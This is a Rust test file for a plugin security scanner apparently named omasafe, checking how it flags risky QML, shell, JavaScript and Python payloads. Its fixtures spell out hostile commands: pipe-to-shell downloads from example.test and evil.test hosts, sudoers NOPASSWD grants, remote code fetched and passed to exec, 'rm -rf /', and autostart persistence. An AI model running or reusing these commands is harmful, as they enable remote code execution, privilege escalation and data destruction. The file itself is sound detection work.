    #[test]
    fn chained_network_execution_produces_network_finding() {
        let inventory = PayloadInventory {
            entries: vec![entry("Evil.qml", PayloadKind::Qml, EVIL_QML.len())],
            ..Default::default()
        };
        let expected = EVIL_QML.as_bytes().to_vec();
        let (artifacts, inventory) =
            super::tests::analyze_with(inventory, &[("Evil.qml", &expected)]);
        let findings = artifacts.rendered_findings();
        let rules: Vec<&str> = findings
            .iter()
            .map(|finding| finding.rule_id.as_str())
            .collect();
        assert!(rules.contains(&PROCESS_RULE), "{rules:?}");
        assert!(rules.contains(&DETACHED_RULE), "{rules:?}");
        assert_eq!(inventory.entries[0].coverage_state, CoverageState::Analyzed);
        // Every rendered finding carries the full report contract.
        for finding in artifacts.rendered_findings() {
            assert!(!finding.title.is_empty());
            assert!(!finding.explanation.is_empty());
            assert!(!finding.review_guidance.is_empty());
            assert!(finding.line.unwrap_or(0) >= 1);
            assert_eq!(
                finding.confidence.as_deref(),
                if cfg!(feature = "qml-parser") {
                    Some("ast-backed")
                } else {
                    Some("lexical-fallback")
                }
            );
        }
    }

    #[test]
    fn static_plain_execdetached_stays_capability_only() {
        let source = r#"Item { Component.onCompleted: Quickshell.execDetached("systemctl --user restart foo") }"#;
        let inventory = PayloadInventory {
            entries: vec![entry("Calm.qml", PayloadKind::Qml, source.len())],
            ..Default::default()
        };
        let (artifacts, _) =
            super::tests::analyze_with(inventory, &[("Calm.qml", source.as_bytes())]);
        assert!(
            !artifacts
                .rendered_findings()
                .iter()
                .any(|finding| finding.rule_id == DETACHED_RULE),
            "static plain detached execution is a capability, not a finding"
        );
        assert!(
            artifacts
                .capabilities
                .iter()
                .any(|capability| capability.capability == "detached-process-execution")
        );
    }

    #[test]
    fn standalone_javascript_is_lexical_with_chain_detection() {
        let source = r#"function run(url) {
    var xhr = new XMLHttpRequest()
    fetch("https://example.test/y")
    xhr.onreadystatechange = function() {
        execDetached(xhr.responseText)
    }
}
"#;
        let inventory = PayloadInventory {
            entries: vec![entry("helper.js", PayloadKind::JavaScript, source.len())],
            ..Default::default()
        };
        let (artifacts, inventory) =
            super::tests::analyze_with(inventory, &[("helper.js", source.as_bytes())]);
        let findings = artifacts.rendered_findings();
        assert!(
            findings
                .iter()
                .any(|finding| finding.rule_id == DETACHED_RULE
                    && finding.evidence == "network-response-executed"),
            "{findings:?}"
        );
        assert!(
            !findings
                .iter()
                .any(|finding| finding.rule_id == NETWORK_RULE),
            "lexical co-occurrence alone must stay capability-only"
        );
        assert!(
            findings
                .iter()
                .all(|finding| finding.confidence.as_deref() == Some("lexical-fallback"))
        );
        assert_eq!(inventory.entries[0].coverage_state, CoverageState::Analyzed);
    }

    #[test]
    fn invocation_edges_resolve_and_mark_targets() {
        let helper_qml = "Text { text: \"helper\" }\n";
        let script_js = "// referenced helper\n";
        let unreferenced_script = "#!/bin/sh\necho no-one-points-here\n";
        let shell_payload = PayloadEntry {
            kind: PayloadKind::Shell,
            executable: true,
            ..entry(
                "tools/run.sh",
                PayloadKind::Shell,
                unreferenced_script.len(),
            )
        };
        let mut inventory = PayloadInventory {
            entries: vec![
                entry("App.qml", PayloadKind::Qml, EVIL_QML.len()),
                entry("Helper.qml", PayloadKind::Qml, helper_qml.len()),
                entry("scripts/lib.js", PayloadKind::JavaScript, script_js.len()),
                entry("orphan.sh", PayloadKind::Shell, unreferenced_script.len()),
                shell_payload,
            ],
            ..Default::default()
        };
        // App.qml references Helper.qml and scripts/lib.js; nothing references the shells.
        let app_source = format!("{}\nFileView {{ path: \"./scripts/lib.js\" }}\n", EVIL_QML);
        let contents: Vec<(&str, Vec<u8>)> = vec![
            ("App.qml", app_source.into_bytes()),
            ("Helper.qml", helper_qml.as_bytes().to_vec()),
            ("scripts/lib.js", script_js.as_bytes().to_vec()),
            ("orphan.sh", unreferenced_script.as_bytes().to_vec()),
            ("tools/run.sh", unreferenced_script.as_bytes().to_vec()),
        ];
        let lookup: std::collections::BTreeMap<String, Vec<u8>> = contents
            .into_iter()
            .map(|(path, bytes)| (path.to_owned(), bytes))
            .collect();
        let budget = TimeBudget::default();
        let artifacts = analyze_inventory(
            &mut inventory,
            &|entry| lookup.get(&entry.relative_path).cloned(),
            &budget,
        );

        let targets: Vec<&str> = artifacts
            .edges
            .iter()
            .map(|edge| edge.target_path.as_str())
            .collect();
        assert!(targets.contains(&"Helper.qml"), "{targets:?}");
        assert!(targets.contains(&"scripts/lib.js"), "{targets:?}");
        let helper_index = inventory
            .entries
            .iter()
            .position(|e| e.relative_path == "Helper.qml")
            .unwrap();
        assert!(inventory.entries[helper_index].invocation_target);
        // Shell payloads keep Unsupported but gain the referenced marker only when pointed at.
        assert!(
            !inventory
                .entries
                .iter()
                .any(|e| e.relative_path == "orphan.sh" && e.invocation_target)
        );
        // Traversal and scheme literals never become edges.
        assert!(
            !targets
                .iter()
                .any(|target| target.contains("..") || target.starts_with('/'))
        );
    }

    #[test]
    fn fingerprint_is_end_to_end_deterministic_and_input_sensitive() {
        let make = |command_literal: &str| {
            let source = format!("Process {{ command: [\"sh\", \"-c\", \"{command_literal}\"] }}");
            let mut inventory = PayloadInventory {
                entries: vec![entry("Main.qml", PayloadKind::Qml, source.len())],
                ..Default::default()
            };
            let budget = TimeBudget::default();
            let artifacts = analyze_inventory(
                &mut inventory,
                &|_| Some(source.clone().into_bytes()),
                &budget,
            );
            (artifacts, inventory)
        };
        let (first, inv_first) = make("ls -la");
        let (second, inv_second) = make("ls -la");
        let (different, _) = make("rm -rf /");

        let policy = crate::policy_identity();
        let section_one = AnalysisSection::new(
            policy.clone(),
            crate::fingerprint_analysis(&first.results, &first.capabilities),
            inv_first.limitations.clone(),
            first.rendered_findings(),
            first.capabilities.clone(),
            first.edges.clone(),
            parser_metadata(),
            None,
        );
        let section_two = AnalysisSection::new(
            policy.clone(),
            crate::fingerprint_analysis(&second.results, &second.capabilities),
            inv_second.limitations.clone(),
            second.rendered_findings(),
            second.capabilities.clone(),
            second.edges.clone(),
            parser_metadata(),
            None,
        );
        let section_three = AnalysisSection::new(
            policy,
            crate::fingerprint_analysis(&different.results, &different.capabilities),
            Vec::new(),
            different.rendered_findings(),
            different.capabilities.clone(),
            different.edges.clone(),
            parser_metadata(),
            None,
        );

        let render = |section: &AnalysisSection| {
            serde_json::to_vec(&Report::new(
                "omasafe 0.1.2",
                "2026-01-01T00:00:00Z".to_owned(),
                section,
            ))
            .unwrap()
        };
        // Identical source+policy ⇒ identical analysis bytes modulo envelope.
        assert_eq!(
            section_one.analysis_fingerprint,
            section_two.analysis_fingerprint
        );
        assert_ne!(
            section_one.analysis_fingerprint,
            section_three.analysis_fingerprint
        );
        // Golden pins: canonicalization drift must break these loudly.
        #[cfg(feature = "qml-parser")]
        assert_eq!(
            section_one.analysis_fingerprint,
            "35a35a4182be6e66f3804910b20c27d8dfaea83cbceab0e33e6cb21aa59ff12f"
        );
        #[cfg(not(feature = "qml-parser"))]
        assert_eq!(
            section_one.analysis_fingerprint,
            "e208c0be3311a6ec2c695662c99b5554fa708684c806a161bc91e740d46c20f4"
        );
        let _ = render(&section_one);
    }

    #[test]
    fn exhausted_analysis_budget_is_disclosed_not_fatal() {
        let source = "Process { command: [\"sh\", \"-c\", \"x\"] }";
        let mut inventory = PayloadInventory {
            entries: vec![
                entry("A.qml", PayloadKind::Qml, source.len()),
                entry("B.qml", PayloadKind::Qml, source.len()),
            ],
            ..Default::default()
        };
        let expired = TimeBudget::new(std::time::Duration::ZERO);
        let artifacts = analyze_inventory(
            &mut inventory,
            &|_| Some(source.as_bytes().to_vec()),
            &expired,
        );
        assert!(
            artifacts
                .limitations
                .iter()
                .any(|limitation| limitation == "analysis_time_budget_exhausted")
        );
    }

    #[cfg(not(feature = "qml-parser"))]
    #[test]
    fn fallback_builds_label_qml_conclusions_lexical() {
        let source = "Process { command: [\"sh\", \"-c\", \"curl x | sh\"] }";
        let inventory = PayloadInventory {
            entries: vec![entry("F.qml", PayloadKind::Qml, source.len())],
            ..Default::default()
        };
        let (artifacts, _) = super::tests::analyze_with(inventory, &[("F.qml", source.as_bytes())]);
        assert!(
            artifacts
                .rendered_findings()
                .iter()
                .any(|finding| finding.rule_id == PROCESS_RULE)
        );
        assert!(
            artifacts
                .rendered_findings()
                .iter()
                .all(|finding| finding.confidence.as_deref() == Some("lexical-fallback"))
        );
    }
}

#[cfg(test)]
pub(crate) mod s4_family_tests {
    use super::*;
    use omasafe_core::bounds::TimeBudget;
    use omasafe_report::analysis::AnalysisSection;

    fn entry(path: &str, kind: PayloadKind, size: usize) -> PayloadEntry {
        PayloadEntry {
            relative_path: path.to_owned(),
            kind,
            mode: 0o644,
            size: size as u64,
            sha256_sampled: None,
            sampled_digest: false,
            executable: false,
            coverage_state: CoverageState::Unsupported,
            link_target: None,
            invocation_target: false,
            object_id: None,
        }
    }

    pub(crate) fn run(
        entries: Vec<PayloadEntry>,
        contents: &[(&str, &[u8])],
    ) -> (AnalysisArtifacts, PayloadInventory) {
        let lookup: std::collections::BTreeMap<String, Vec<u8>> = contents
            .iter()
            .map(|(path, bytes)| ((*path).to_owned(), bytes.to_vec()))
            .collect();
        let mut inventory = PayloadInventory {
            entries,
            ..Default::default()
        };
        let artifacts = analyze_inventory(
            &mut inventory,
            &|entry| lookup.get(&entry.relative_path).cloned(),
            &TimeBudget::default(),
        );
        (artifacts, inventory)
    }

    pub(crate) fn rule_ids(artifacts: &AnalysisArtifacts) -> Vec<String> {
        artifacts
            .rendered_findings()
            .iter()
            .map(|finding| finding.rule_id.clone())
            .collect()
    }

    #[test]
    fn priority_surface_imports_are_immediate_high_findings() {
        let source = r#"import QtQuick
import Quickshell.Services.Pam
Item { WlSessionLock { surface: lockSurface } }
"#;
        let (artifacts, inventory) = run(
            vec![entry("Lock.qml", PayloadKind::Qml, source.len())],
            &[("Lock.qml", source.as_bytes())],
        );
        let ids = rule_ids(&artifacts);
        assert!(
            ids.contains(&"oma.qml.pam-authentication".to_owned()),
            "{ids:?}"
        );
        assert!(ids.contains(&"oma.qml.session-lock".to_owned()), "{ids:?}");
        for finding in artifacts.rendered_findings() {
            if finding.rule_id.starts_with("oma.qml.pam")
                || finding.rule_id.starts_with("oma.qml.session")
                || finding.rule_id.starts_with("oma.qml.polkit")
            {
                assert_eq!(finding.severity, "high");
            }
        }
        assert_eq!(inventory.entries[0].coverage_state, CoverageState::Analyzed);
    }

    #[test]
    fn polkit_import_is_a_high_finding_without_usage() {
        let source = "import Quickshell.Services.Polkit\nItem {}\n";
        let (artifacts, _) = run(
            vec![entry("Agent.qml", PayloadKind::Qml, source.len())],
            &[("Agent.qml", source.as_bytes())],
        );
        let findings = artifacts.rendered_findings();
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, "oma.qml.polkit-agent-ui");
        assert_eq!(findings[0].severity, "high");
    }

    #[test]
    fn benign_qml_stays_free_of_priority_findings() {
        let source = r#"import QtQuick
Text { text: "hello"; clipboardHelper: false }
Timer { running: true }
"#;
        let (artifacts, _) = run(
            vec![entry("Calm3.qml", PayloadKind::Qml, source.len())],
            &[("Calm3.qml", source.as_bytes())],
        );
        assert!(
            rule_ids(&artifacts).is_empty(),
            "{:?}",
            rule_ids(&artifacts)
        );
    }

    #[test]
    fn dynamic_code_construction_is_detected() {
        let source = r#"Item {
    Component.onCompleted: {
        var panel = Qt.createQmlObject(panelSource, root, "dyn");
        var handler = eval(userInput)
    }
}
"#;
        let (artifacts, _) = run(
            vec![entry("Dyn2.qml", PayloadKind::Qml, source.len())],
            &[("Dyn2.qml", source.as_bytes())],
        );
        let ids = rule_ids(&artifacts);
        assert_eq!(
            ids.iter()
                .filter(|id| *id == "oma.qml.dynamic-code")
                .count(),
            2,
            "both constructions surface: {ids:?}"
        );
        assert!(
            artifacts
                .capabilities
                .iter()
                .any(|capability| capability.capability == "dynamic-code-execution")
        );
    }

    #[test]
    fn encoded_literal_indicator_has_boundary() {
        // Boundary below the threshold stays silent.
        let short = format!("Item {{ property string p: \"{}\" }}", "ab12".repeat(15)); // 60 chars
        let (artifacts_short, _) = run(
            vec![entry("Short.qml", PayloadKind::Qml, short.len())],
            &[("Short.qml", short.as_bytes())],
        );
        assert!(
            !rule_ids(&artifacts_short)
                .contains(&"oma.qml.obfuscated-payload-indicator".to_owned())
        );

        // At/over the threshold with base64 shape surfaces an indicator.
        let long_payload = format!("{}{}{}", "a".repeat(32), "9".repeat(32), "=="); // 66 chars
        let long_source = format!("Item {{ property string p: \"{long_payload}\" }}");
        let (artifacts_long, _) = run(
            vec![entry("Long.qml", PayloadKind::Qml, long_source.len())],
            &[("Long.qml", long_source.as_bytes())],
        );
        let ids = rule_ids(&artifacts_long);
        assert!(
            ids.contains(&"oma.qml.obfuscated-payload-indicator".to_owned()),
            "{ids:?}"
        );

        // Prose of the same length is not base64-shaped.
        let prose = format!("Item {{ property string p: \"{}\" }}", "word ".repeat(20));
        let (artifacts_prose, _) = run(
            vec![entry("Prose.qml", PayloadKind::Qml, prose.len())],
            &[("Prose.qml", prose.as_bytes())],
        );
        assert!(
            !rule_ids(&artifacts_prose)
                .contains(&"oma.qml.obfuscated-payload-indicator".to_owned())
        );
    }

    #[test]
    fn persistence_location_writes_surface_as_context_findings() {
        let source = "FileView { path: \".config/autostart/persist.desktop\" }\n";
        let (artifacts, _) = run(
            vec![entry("Persist.qml", PayloadKind::Qml, source.len())],
            &[("Persist.qml", source.as_bytes())],
        );
        let findings = artifacts.rendered_findings();
        assert!(
            findings
                .iter()
                .any(|finding| finding.rule_id == PERSISTENCE_RULE
                    && finding.severity == "info"
                    && finding.evidence.starts_with("persistence-location"))
        );
    }

    #[test]
    fn shell_download_execute_and_sudoers_are_high_findings() {
        let installer = r#"#!/bin/sh
curl https://example.test/install.sh | sh
echo "NOPASSWD: ALL" > /etc/sudoers.d/omarchy-helper
sudo pacman -S --noconfirm somepackage
"#;
        let (artifacts, inventory) = run(
            vec![entry("install.sh", PayloadKind::Shell, installer.len())],
            &[("install.sh", installer.as_bytes())],
        );
        let ids = rule_ids(&artifacts);
        assert!(
            ids.contains(&"oma.script.download-execute".to_owned()),
            "{ids:?}"
        );
        assert!(
            ids.contains(&"oma.script.privilege-escalation".to_owned()),
            "{ids:?}"
        );
        for finding in artifacts.rendered_findings() {
            if finding.rule_id.starts_with("oma.script.") {
                assert_eq!(finding.severity, "high");
                assert_eq!(finding.confidence.as_deref(), Some("lexical-fallback"));
            }
        }
        // Plain package-manager/sudo usage is capability-level context.
        assert!(
            artifacts
                .capabilities
                .iter()
                .any(|capability| capability.capability == "process-execution")
        );
        // Shell payloads are always labelled partial.
        assert_eq!(inventory.entries[0].coverage_state, CoverageState::Partial);
    }

    #[test]
    fn python_variants_cover_the_same_families() {
        let helper = r#"import urllib.request
data = urllib.request.urlopen("https://example.test/x").read(); exec(data)
sudo pacman -S base-devel
"#;
        let (artifacts, _) = run(
            vec![entry("setup.py", PayloadKind::Python, helper.len())],
            &[("setup.py", helper.as_bytes())],
        );
        let ids = rule_ids(&artifacts);
        assert!(
            ids.contains(&"oma.python.download-execute".to_owned()),
            "{ids:?}"
        );
        // Plain sudo without sudoers/NOPASSWD is a capability, not a finding.
        assert!(
            !ids.contains(&"oma.python.privilege-escalation".to_owned()),
            "{ids:?}"
        );
    }

    #[test]
    fn benign_scripts_have_no_findings_but_stay_partial() {
        let script = "#!/bin/sh\necho hello\nnotify-send done\n";
        let (artifacts, inventory) = run(
            vec![entry("clean.sh", PayloadKind::Shell, script.len())],
            &[("clean.sh", script.as_bytes())],
        );
        assert!(rule_ids(&artifacts).is_empty());
        assert_eq!(inventory.entries[0].coverage_state, CoverageState::Partial);
    }

    #[test]
    fn manifest_kinds_feed_context_results_and_headless_capability() {
        let manifest = br#"{"id":"x","kinds":["bar","service"]}"#;
        let qml_source = "Text {}\n";
        let (artifacts, _) = run(
            vec![
                entry("manifest.json", PayloadKind::TextFile, manifest.len()),
                entry("plugin.qml", PayloadKind::Qml, qml_source.len()),
            ],
            &[
                ("manifest.json", manifest),
                ("plugin.qml", qml_source.as_bytes()),
            ],
        );
        let ids = rule_ids(&artifacts);
        assert!(ids.contains(&REPLACES_BAR_RULE.to_owned()), "{ids:?}");
        let rendered_findings = artifacts.rendered_findings();
        let replaces_bar = rendered_findings
            .iter()
            .find(|finding| finding.rule_id == REPLACES_BAR_RULE)
            .unwrap();
        assert_eq!(replaces_bar.severity, "info");
        assert_eq!(replaces_bar.language, "context");
        assert!(
            artifacts
                .capabilities
                .iter()
                .any(
                    |capability| capability.capability == "persistence-scheduling"
                        && capability.detail == "headless-service-kind"
                )
        );
    }

    #[test]
    fn priority_ordering_puts_critical_and_high_first() {
        let high_source = "import Quickshell.Services.Polkit\nItem {}\n";
        let medium_source = "Process { command: [\"sh\", \"-c\", \"ls\"] }\n";
        let (artifacts, _) = run(
            vec![
                entry("M.qml", PayloadKind::Qml, medium_source.len()),
                entry("H.qml", PayloadKind::Qml, high_source.len()),
            ],
            &[
                ("M.qml", medium_source.as_bytes()),
                ("H.qml", high_source.as_bytes()),
            ],
        );
        let all_findings = artifacts.rendered_findings();
        let severities: Vec<&str> = all_findings
            .iter()
            .map(|finding| finding.severity.as_str())
            .collect();
        let mut sorted = severities.clone();
        let rank = |value: &str| match value {
            "critical" => 4,
            "high" => 3,
            "medium" => 2,
            "low" => 1,
            _ => 0,
        };
        sorted.sort_by_key(|value| std::cmp::Reverse(rank(value)));
        assert_eq!(severities, sorted, "priority ordering violated");
    }

    #[test]
    fn equivalence_map_records_marketplace_baseline_v3() {
        let map = crate::EquivalenceMap::embedded();
        assert_eq!(map.external_ruleset_version, "3");
        assert!(map.is_stale_against("4"));
        let section = AnalysisSection::new(
            crate::policy_identity(),
            String::new(),
            Vec::new(),
            Vec::new(),
            Vec::new(),
            Vec::new(),
            parser_metadata(),
            Some(omasafe_report::analysis::EquivalenceSummary {
                map_version: map.map_version.clone(),
                external_system: map.external_system.clone(),
                external_ruleset_name: map.external_ruleset_name.clone(),
                external_ruleset_version: map.external_ruleset_version.clone(),
            }),
        );
        let rendered = serde_json::to_string(&section).unwrap();
        assert!(rendered.contains("\"external_ruleset_version\":\"3\""));
    }
}

#[cfg(test)]
mod s4_boundary_tests {
    use super::s4_family_tests::{rule_ids, run};
    use super::*;
    use omasafe_core::bounds::TimeBudget;

    fn one(path: &str, kind: PayloadKind, source: &str) -> (AnalysisArtifacts, PayloadInventory) {
        super::s4_family_tests::run(
            vec![entry(path, kind, source.len())],
            &[(path, source.as_bytes())],
        )
    }

    fn entry(path: &str, kind: PayloadKind, size: usize) -> PayloadEntry {
        PayloadEntry {
            relative_path: path.to_owned(),
            kind,
            mode: 0o644,
            size: size as u64,
            sha256_sampled: None,
            sampled_digest: false,
            executable: false,
            coverage_state: CoverageState::Unsupported,
            link_target: None,
            invocation_target: false,
            object_id: None,
        }
    }

    #[test]
    fn base64_indicator_exact_boundaries() {
        let make = |payload: String| {
            let source = format!("Item {{ property string p: \"{payload}\" }}");
            one("B.qml", PayloadKind::Qml, &source)
        };
        // 63 chars: below threshold -> silent.
        let (artifacts63, _) = make("a9".repeat(31) + "a");
        assert!(rule_ids(&artifacts63).is_empty());
        // 64 chars letters+digits: fires.
        let (artifacts64, _) = make("a9".repeat(32));
        assert!(
            rule_ids(&artifacts64).contains(&"oma.qml.obfuscated-payload-indicator".to_owned())
        );
        // Letters-only and digits-only never fire regardless of length.
        let (artifacts_letters, _) = make("a".repeat(70));
        assert!(
            !rule_ids(&artifacts_letters)
                .contains(&"oma.qml.obfuscated-payload-indicator".to_owned())
        );
        let (artifacts_digits, _) = make("7".repeat(70));
        assert!(
            !rule_ids(&artifacts_digits)
                .contains(&"oma.qml.obfuscated-payload-indicator".to_owned())
        );
    }

    #[test]
    fn clipboard_and_compositor_capabilities_surface() {
        let source = r#"Item {
    ClipboardText { onTextChanged: log() }
    HyprlandWorkspace { id: ws }
}
"#;
        let (artifacts, _) = one("Surfaces.qml", PayloadKind::Qml, source);
        let capabilities: Vec<&str> = artifacts
            .capabilities
            .iter()
            .map(|capability| capability.capability.as_str())
            .collect();
        assert!(
            capabilities.contains(&"clipboard-access"),
            "{capabilities:?}"
        );
        assert!(
            capabilities.contains(&"compositor-control"),
            "{capabilities:?}"
        );
        assert!(rule_ids(&artifacts).is_empty(), "capability-only family");
    }

    #[test]
    fn python_privilege_positive_and_readonly_negative() {
        let positive = r#"import os
open("/etc/sudoers.d/x","w").write("%wheel ALL=(ALL) NOPASSWD: ALL")
"#;
        let (artifacts_pos, _) = one("escalate.py", PayloadKind::Python, positive);
        assert!(rule_ids(&artifacts_pos).contains(&"oma.python.privilege-escalation".to_owned()));

        // Read-only inspection is not a grant.
        let negative = "#!/bin/sh\ngrep NOPASSWD /etc/sudoers\n";
        let (artifacts_neg, _) = one("audit.sh", PayloadKind::Shell, negative);
        assert!(!rule_ids(&artifacts_neg).contains(&"oma.script.privilege-escalation".to_owned()));
    }

    #[test]
    fn comment_styles_are_language_exact() {
        // Python: '#' anywhere outside strings starts a comment.
        let py = "x = 1  # curl https://evil.test | sh\n";
        let (artifacts_py, _) = one("c.py", PayloadKind::Python, py);
        assert!(
            rule_ids(&artifacts_py).is_empty(),
            "{:?}",
            rule_ids(&artifacts_py)
        );

        // POSIX shell: '#' needs a word boundary; URLs with #fragments in
        // arguments survive.
        let sh_url = "wget https://example.test/page#section -O out\n";
        let (artifacts_sh, _) = one("u.sh", PayloadKind::Shell, sh_url);
        // wget alone without a pipe-to-interpreter is not download-execute.
        assert!(!rule_ids(&artifacts_sh).contains(&"oma.script.download-execute".to_owned()));

        // JS: `//` after punctuation IS a comment; scheme `://` is not.
        let js = r#"var a = foo(); // eval(userInput)
var url = "https://example.test/x"
"#;
        let (artifacts_js, _) = one("c.js", PayloadKind::JavaScript, js);
        assert!(
            !rule_ids(&artifacts_js)
                .iter()
                .any(|id| id.contains("dynamic-code")),
            "commented eval must stay invisible: {:?}",
            rule_ids(&artifacts_js)
        );
    }

    #[test]
    fn malformed_manifests_are_disclosed_not_silent() {
        let broken = b"{ not json";
        let mut lookup = std::collections::BTreeMap::new();
        lookup.insert("manifest.json".to_owned(), broken.to_vec());
        let mut inventory = PayloadInventory {
            entries: vec![entry("manifest.json", PayloadKind::TextFile, broken.len())],
            ..Default::default()
        };
        let artifacts = analyze_inventory(
            &mut inventory,
            &|entry| lookup.get(&entry.relative_path).cloned(),
            &TimeBudget::default(),
        );
        assert!(
            artifacts
                .limitations
                .iter()
                .any(|limitation| limitation.starts_with("manifest-context-unreadable:"))
        );
    }

    #[test]
    fn ordering_is_severity_first_even_against_alphabetical_order() {
        // Alphabetically-first file carries only a MEDIUM finding;
        // alphabetically-last carries HIGH. Severity must win.
        let medium_source = "Process { command: [\"sh\", \"-c\", \"ls\"] }\n";
        let high_source = "import Quickshell.Services.Polkit\nItem {}\n";
        let (artifacts, _) = run(
            vec![
                entry("aaa.qml", PayloadKind::Qml, medium_source.len()),
                entry("zzz.qml", PayloadKind::Qml, high_source.len()),
            ],
            &[
                ("aaa.qml", medium_source.as_bytes()),
                ("zzz.qml", high_source.as_bytes()),
            ],
        );
        let findings = artifacts.rendered_findings();
        assert_eq!(findings[0].severity, "high", "{findings:?}");
        assert_eq!(findings.last().unwrap().severity, "medium");
    }

    #[test]
    fn within_a_severity_band_order_is_path_then_rule_then_line() {
        // Both files carry a session-lock finding on line 1 and a polkit
        // finding on line 2. Within the High band, path must group m.qml
        // before z.qml and rule id must outrank line number (polkit before
        // session-lock despite its higher line). Emission count varies by
        // parser configuration (import + surface evidences), so ordering is
        // asserted over ranks rather than an exact multiset.
        let source =
            "import Quickshell.WlSessionLock\nimport Quickshell.Services.Polkit\nItem {}\n";
        let (artifacts, _) = run(
            vec![
                entry("m.qml", PayloadKind::Qml, source.len()),
                entry("z.qml", PayloadKind::Qml, source.len()),
            ],
            &[("m.qml", source.as_bytes()), ("z.qml", source.as_bytes())],
        );
        let rendered = artifacts.rendered_findings();
        assert!(
            rendered.iter().all(|finding| finding.severity == "high"),
            "both rules are High: {rendered:?}"
        );
        assert!(rendered.len() >= 4, "{rendered:?}");
        // The interesting inversion exists: m.qml polkit@2 precedes
        // m.qml session-lock@1.
        let contains = |path: &str, rule: &str, line: u32| {
            rendered.iter().any(|finding| {
                finding.relative_path == path
                    && finding.rule_id == rule
                    && finding.line == Some(line)
            })
        };
        assert!(
            contains("m.qml", "oma.qml.polkit-agent-ui", 2),
            "{rendered:?}"
        );
        assert!(contains("m.qml", "oma.qml.session-lock", 1), "{rendered:?}");
        assert!(
            contains("z.qml", "oma.qml.polkit-agent-ui", 2),
            "{rendered:?}"
        );
        assert!(contains("z.qml", "oma.qml.session-lock", 1), "{rendered:?}");
        let rank = |path: &str, rule: &str| -> (usize, usize) {
            (
                usize::from(path == "z.qml"),
                usize::from(rule != "oma.qml.polkit-agent-ui"),
            )
        };
        let keys: Vec<(usize, usize, u32)> = rendered
            .iter()
            .map(|finding| {
                let (path_rank, rule_rank) = rank(&finding.relative_path, &finding.rule_id);
                (path_rank, rule_rank, finding.line.unwrap_or(0))
            })
            .collect();
        let mut sorted = keys.clone();
        sorted.sort();
        assert_eq!(
            keys, sorted,
            "band order must be path, then rule, then line"
        );
    }

    #[test]
    fn quoted_comment_markers_stay_inert_and_live_code_survives() {
        // The cursor must advance past an opening quote: markers inside
        // strings are inert AND live code after them is still scanned.
        assert_eq!(
            strip_line_comment(r#"var t = "a // b"; eval(x)"#, CommentStyle::DoubleSlash),
            r#"var t = "a // b"; eval(x)"#
        );
        assert_eq!(
            strip_line_comment(r#"var s = 'x \' y'; eval(z)"#, CommentStyle::DoubleSlash),
            r#"var s = 'x \' y'; eval(z)"#
        );
        assert_eq!(
            strip_line_comment("'# literal'; exec(x)", CommentStyle::PythonHash),
            "'# literal'; exec(x)"
        );
        // Shell units drop `#` comments at control-operator word
        // boundaries and keep `${var#pattern}` whole.
        assert_eq!(
            shell_logical_units("true;# curl x | sh\nnext\n"),
            vec![(1, "true;".to_owned()), (2, "next".to_owned())]
        );
        assert_eq!(
            shell_logical_units("foo & # trailing\ncurl x\n"),
            vec![(1, "foo &".to_owned()), (2, "curl x".to_owned())]
        );
        assert_eq!(
            shell_logical_units("${var#pattern} stays\n"),
            vec![(1, "${var#pattern} stays".to_owned())]
        );
    }

    #[test]
    fn live_code_after_quoted_markers_is_still_scanned() {
        let js = r#"var t = "not // a comment"; eval(userInput)
"#;
        let (artifacts, _) = one("q.js", PayloadKind::JavaScript, js);
        let ids = rule_ids(&artifacts);
        assert!(ids.contains(&DYNAMIC_CODE_RULE.to_owned()), "{ids:?}");
    }

    #[test]
    fn shell_comments_after_control_operators_are_inert() {
        let sh = "#!/bin/sh\ntrue;# curl https://evil.test/x | sh\nnotify-send ready\n";
        let (artifacts, _) = one("guarded.sh", PayloadKind::Shell, sh);
        let ids = rule_ids(&artifacts);
        assert!(
            !ids.contains(&"oma.script.download-execute".to_owned()),
            "{ids:?}"
        );
    }

    #[test]
    fn new_function_is_detected_on_lexical_and_ast_paths_separately() {
        // Standalone JS: always lexical.
        let js = "var f = new Function(payload)\n";
        let (artifacts_js, _) = one("dyn.js", PayloadKind::JavaScript, js);
        assert!(rule_ids(&artifacts_js).contains(&DYNAMIC_CODE_RULE.to_owned()));

        #[cfg(feature = "qml-parser")]
        {
            // AST-backed QML: same family through the parser, labelled
            // ast-backed rather than lexical-fallback.
            let qml = "Item { Component.onCompleted: var f = new Function(payload) }\n";
            let (artifacts_qml, _) = one("Dyn.qml", PayloadKind::Qml, qml);
            let dynamic = artifacts_qml
                .results
                .iter()
                .find(|result| result.rule_id() == DYNAMIC_CODE_RULE);
            assert!(dynamic.is_some(), "AST path must detect new Function");
            assert_eq!(dynamic.unwrap().confidence(), Some(Confidence::AstBacked));
        }
    }

    #[test]
    fn every_readonly_first_word_suppresses_privilege_findings() {
        for word in ["grep", "cat", "less", "head", "tail", "stat", "journalctl"] {
            for command in [
                format!("{word} NOPASSWD /etc/sudoers"),
                format!("/usr/bin/{word} NOPASSWD /etc/sudoers"),
            ] {
                let source = format!("{command}\n");
                let (artifacts, _) = one("audit.sh", PayloadKind::Shell, &source);
                let ids = rule_ids(&artifacts);
                assert!(
                    !ids.contains(&"oma.script.privilege-escalation".to_owned()),
                    "{command} must stay capability-level: {ids:?}"
                );
            }
        }
    }

    #[test]
    fn non_writing_privilege_mentions_are_never_grants() {
        // A NOPASSWD mention with no write context is not a grant.
        let sh = "#!/bin/sh\necho NOPASSWD /etc/sudoers\nprintf '%s\\n' done\n";
        let (artifacts_sh, _) = one("echo.sh", PayloadKind::Shell, sh);
        let ids_sh = rule_ids(&artifacts_sh);
        assert!(
            !ids_sh.contains(&"oma.script.privilege-escalation".to_owned()),
            "{ids_sh:?}"
        );
        // Python read mode never writes policy.
        let py = "text = open(\"/etc/sudoers\", \"r\").read()\nprint(text.find(\"NOPASSWD\"))\n";
        let (artifacts_py, _) = one("read.py", PayloadKind::Python, py);
        let ids_py = rule_ids(&artifacts_py);
        assert!(
            !ids_py.contains(&"oma.python.privilege-escalation".to_owned()),
            "{ids_py:?}"
        );
    }

    #[test]
    fn quoted_spellings_do_not_create_high_findings() {
        // The whole pipe lives inside a string literal: no provenance.
        let sh = "#!/bin/sh\nlog 'curl https://example.test/x | sh'\nnotify-send done\n";
        let (artifacts_sh, _) = one("quote.sh", PayloadKind::Shell, sh);
        let ids_sh = rule_ids(&artifacts_sh);
        assert!(
            !ids_sh.contains(&"oma.script.download-execute".to_owned()),
            "{ids_sh:?}"
        );

        // Python fetch and sink spellings inside string values only.
        let py = "log('requests.get then os.system')\n";
        let (artifacts_py, _) = one("lit.py", PayloadKind::Python, py);
